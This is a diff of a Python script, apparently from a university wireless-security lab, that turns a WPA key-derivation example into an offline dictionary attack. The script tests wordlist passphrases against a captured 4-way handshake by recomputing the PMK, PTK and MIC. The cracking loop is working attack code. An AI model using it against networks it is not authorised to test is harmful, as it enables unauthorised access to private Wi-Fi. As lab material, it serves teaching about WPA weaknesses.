@@ -2,32 +2,27 @@
 # -*- coding: utf-8 -*-
 
 """
-Derive WPA keys from Passphrase and 4-way handshake info
-
-Calcule un MIC d'authentification (le MIC pour la transmission de données
-utilise l'algorithme Michael. Dans ce cas-ci, l'authentification, on utilise
-sha-1 pour WPA2 ou MD5 pour WPA)
+Found the passphrase of a AP using WPA
 """
 
-__author__ = "Abraham Rubinstein et Yann Lederrey"
+__author__ = "Robin Müller et Stéphane Teixeira Carvalho"
 __copyright__ = "Copyright 2017, HEIG-VD"
 __license__ = "GPL"
 __version__ = "1.0"
-__email__ = "abraham.rubinstein@heig-vd.ch"
 __status__ = "Prototype"
 
 from wpa_key_derivation import *
 
-# Read capture file -- it contains beacon, authentication, associacion, handshake and data
+# Read capture file -- it contains beacon, authentication, association, handshake and data
 wpa = rdpcap("wpa_handshake.cap")
 
+A = "Pairwise key expansion"  # This string is used in the pseudo-random function
 # Important parameters for key derivation - most of them can be obtained from the pcap file
-A = "Pairwise key expansion"  # this string is used in the pseudo-random function
 ssid, APmac, Clientmac = getAssociationRequestInfo(wpa)
 ANonce, SNonce, mic_to_test, data = getHandshakeInfo(wpa)
 
 B = min(APmac, Clientmac) + max(APmac, Clientmac) + min(ANonce, SNonce) + max(ANonce,
-                                                                              SNonce)  # used in pseudo-random function
+                                                                              SNonce)  # Used in pseudo-random function
 print("\n\nValues used to derivate keys")
 print("============================")
 print("SSID: ", ssid, "\n")
@@ -36,19 +31,23 @@ print("CLient Mac: ", b2a_hex(Clientmac), "\n")
 print("AP Nonce: ", b2a_hex(ANonce), "\n")
 print("Client Nonce: ", b2a_hex(SNonce), "\n")
 
+# Read from the wordlist
 f = open('./wordlist.txt', 'r')
+# Read each line of the file will. The line will be the passphrase to test
 for passPhrase in f.read().splitlines():
-    # calculate 4096 rounds to obtain the 256 bit (32 oct) PMK
+    # Encode the passphrase and the ssid as bytes
     passPhrase = str.encode(passPhrase)
     ssid_encoded = str.encode(ssid)
+    # Calculate 4096 rounds to obtain the 256 bit (32 oct) PMK
     pmk = pbkdf2(hashlib.sha1, passPhrase, ssid_encoded, 4096, 32)
 
-    # expand pmk to obtain PTK
+    # Expand pmk to obtain PTK
     ptk = customPRF512(pmk, str.encode(A), B)
 
-    # calculate MIC over EAPOL payload (Michael)- The ptk is, in fact, KCK|KEK|TK|MICK
+    # Calculate MIC over EAPOL payload (Michael)- The ptk is, in fact, KCK|KEK|TK|MICK
     mic = hmac.new(ptk[0:16], data, hashlib.sha1)
 
+    # Remove the last 4 bytes of the mic calculated because it will contain the ICV
     if mic.digest()[:-4] == mic_to_test:
         print("\nResults of the key expansion")
         print("=============================")
